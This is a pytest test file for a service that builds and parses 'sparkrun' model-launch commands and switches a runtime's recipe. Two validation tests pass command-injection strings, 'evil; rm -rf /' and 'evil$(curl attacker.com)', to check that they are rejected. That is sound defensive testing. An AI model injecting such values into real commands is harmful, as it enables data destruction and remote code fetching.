"""Tests for sparkrun_manager — recipe extraction, command building, switch flow."""
from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest
from sqlmodel.ext.asyncio.session import AsyncSession

from app.models.runtime import Runtime
from app.services import sparkrun_manager


# ── extract_current_recipe ──────────────────────────────────────────────


def test_extract_recipe_from_full_command():
    cmd = (
        "uvx sparkrun run @official/qwen3.6-35b-a3b-fp8-vllm "
        "--solo --no-rm --ensure --no-follow --label mc.runtime.slug=qwen-general"
    )
    assert (
        sparkrun_manager.extract_current_recipe(cmd)
        == "@official/qwen3.6-35b-a3b-fp8-vllm"
    )


def test_extract_recipe_bare_name():
    cmd = "uvx sparkrun run my-custom-recipe --solo"
    assert sparkrun_manager.extract_current_recipe(cmd) == "my-custom-recipe"


def test_extract_recipe_returns_none_for_empty():
    assert sparkrun_manager.extract_current_recipe(None) is None
    assert sparkrun_manager.extract_current_recipe("") is None


def test_extract_recipe_returns_none_when_no_sparkrun_run():
    assert sparkrun_manager.extract_current_recipe("docker start mycontainer") is None


def test_extract_recipe_handles_unbalanced_quotes():
    """Malformed commands shouldn't crash — just return None."""
    assert sparkrun_manager.extract_current_recipe('sparkrun run "broken') is None


# ── build_launch_command ───────────────────────────────────────────────


def test_build_command_includes_required_flags():
    cmd = sparkrun_manager.build_launch_command(
        "@official/qwen3.6-35b-a3b-fp8-vllm", slug="qwen-general"
    )
    assert "uvx sparkrun run @official/qwen3.6-35b-a3b-fp8-vllm" in cmd
    assert "--solo" in cmd
    assert "--no-rm" in cmd
    assert "--ensure" in cmd
    assert "--label mc.runtime.slug=qwen-general" in cmd


def test_build_command_rejects_unsafe_slug():
    with pytest.raises(ValueError, match="slug"):
        sparkrun_manager.build_launch_command("recipe", slug="evil; rm -rf /")


def test_build_command_rejects_unsafe_recipe():
    with pytest.raises(ValueError, match="recipe"):
        sparkrun_manager.build_launch_command(
            "evil$(curl attacker.com)", slug="qwen-general"
        )


def test_build_command_accepts_custom_flags():
    cmd = sparkrun_manager.build_launch_command(
        "my-recipe", slug="test", flags="--solo --debug"
    )
    assert "--solo --debug" in cmd
    assert "--ensure" not in cmd


# ── list_recipes (with mocked SSH) ───────────────────────────────────────


@pytest.mark.asyncio
async def test_list_recipes_parses_sparkrun_output():
    sample_output = (
        "@official/qwen3.6-35b-a3b-fp8-vllm                       vllm-distributed   1    1       0.8       Qwen/Qwen3.6-35B-A3B-FP8                         official\n"
        "@official/qwen3.6-27b-fp8-mtp-vllm                       vllm-distributed   1    1       0.8       Qwen/Qwen3.6-27B-FP8                             official\n"
        "@community/nemotron-3-nano-nvfp4                         vllm-distributed   1    1       0.7       nvidia/NVIDIA-Nemotron-3-Nano-30B-A3B-NVFP4      community\n"
        "@sparkrun-transitional/qwen3-1.7b-vllm                   vllm-distributed   1    1       0.7       Qwen/Qwen3-1.7B                                  community\n"
        "@eugr/qwen3.6-35b-a3b-fp8                                vllm-distributed   1    1       0.8       Qwen/Qwen3.6-35B-A3B-FP8                         experimental"
    )

    # Patch _ssh_run on the runtime_manager module — list_recipes does a
    # `from app.services.runtime_manager import _ssh_run` at call time so the
    # patch lands on the module attribute the import resolves against.
    import app.services.runtime_manager as rm

    with patch.object(rm, "_ssh_run", AsyncMock(return_value=(sample_output, "", 0))):
        recipes = await sparkrun_manager.list_recipes()

    assert len(recipes) == 5
    assert recipes[0]["name"] == "@official/qwen3.6-35b-a3b-fp8-vllm"
    assert recipes[0]["model"] == "Qwen/Qwen3.6-35B-A3B-FP8"
    # Registry parsing is now generic — any prefix between @ and / works.
    assert recipes[0]["registry"] == "official"
    assert recipes[2]["registry"] == "community"
    assert recipes[3]["registry"] == "sparkrun-transitional"
    assert recipes[4]["registry"] == "eugr"


@pytest.mark.asyncio
async def test_list_recipes_returns_empty_on_ssh_failure():
    import app.services.runtime_manager as rm

    with patch.object(
        rm, "_ssh_run", AsyncMock(return_value=("", "ssh: command not found", 127))
    ):
        recipes = await sparkrun_manager.list_recipes()
    assert recipes == []


# ── switch_recipe (DB integration) ──────────────────────────────────────


@pytest.fixture
async def spark_runtime(async_session: AsyncSession) -> Runtime:
    rt = Runtime(
        slug="qwen-general",
        display_name="Spark Qwen vLLM",
        runtime_type="vllm_docker",
        endpoint="http://192.0.2.10:8000/v1",
        model_identifier="Qwen/Qwen3.6-35B-A3B-FP8",
        launch_command=(
            "uvx sparkrun run @official/qwen3.6-35b-a3b-fp8-vllm "
            "--solo --no-rm --ensure --no-follow "
            "--label mc.runtime.slug=qwen-general"
        ),
        container_name="sparkrun_oldid_solo",
        enabled=True,
    )
    async_session.add(rt)
    await async_session.commit()
    await async_session.refresh(rt)
    return rt


@pytest.fixture
async def patched_redis(fake_redis):
    """Patch get_redis in the resolver module (used by invalidate_and_reprobe)."""
    async def _fake_get_redis():
        return fake_redis

    with patch("app.services.runtime_model_resolver.get_redis", _fake_get_redis):
        yield fake_redis


@pytest.mark.asyncio
async def test_switch_recipe_persists_new_command(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """Happy path: switch swaps launch_command + clears stale model_identifier."""
    with (
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": True, "message": "starting"}),
        ),
        # Mock the probe used by the post-switch invalidate_and_reprobe so the
        # test doesn't reach out to a real Spark endpoint. Return None so the
        # resolver's "probe failed" branch is taken and the freshly-nulled
        # model_identifier stays None — matching real-world behaviour while
        # the new container is still warming up.
        patch(
            "app.services.agent_runtime_switch.probe_runtime_model",
            AsyncMock(return_value=None),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-27b-fp8-mtp-vllm",
        )

    assert result["ok"] is True
    assert result["old_recipe"] == "@official/qwen3.6-35b-a3b-fp8-vllm"
    assert result["new_recipe"] == "@official/qwen3.6-27b-fp8-mtp-vllm"

    await async_session.refresh(spark_runtime)
    assert "@official/qwen3.6-27b-fp8-mtp-vllm" in spark_runtime.launch_command
    # Stale model_identifier must be cleared so resolver re-probes the new model
    assert spark_runtime.model_identifier is None
    # Stale container_name must be cleared (sparkrun assigns fresh IDs)
    assert spark_runtime.container_name is None


@pytest.mark.asyncio
async def test_switch_recipe_noop_when_same_recipe(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """Switching to the currently-active recipe must NOT touch DB or restart."""
    stop_mock = AsyncMock()
    start_mock = AsyncMock()
    with (
        patch("app.services.runtime_manager.stop_runtime", stop_mock),
        patch("app.services.runtime_manager.start_runtime", start_mock),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-35b-a3b-fp8-vllm",
        )

    assert result["ok"] is True
    assert "no-op" in result["message"].lower()
    stop_mock.assert_not_called()
    start_mock.assert_not_called()
    # DB row unchanged
    await async_session.refresh(spark_runtime)
    assert spark_runtime.model_identifier == "Qwen/Qwen3.6-35B-A3B-FP8"


@pytest.mark.asyncio
async def test_switch_recipe_reports_start_failure(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """If start_runtime fails after we've persisted the new command, the
    caller learns about it via the returned status — DB state already
    reflects the attempted switch so the operator can retry."""
    with (
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": False, "message": "container did not start"}),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-27b-fp8-mtp-vllm",
        )

    assert result["ok"] is False
    assert "start failed" in result["message"]
    # DB still got updated — caller can retry start without re-confirming recipe
    await async_session.refresh(spark_runtime)
    assert "@official/qwen3.6-27b-fp8-mtp-vllm" in spark_runtime.launch_command
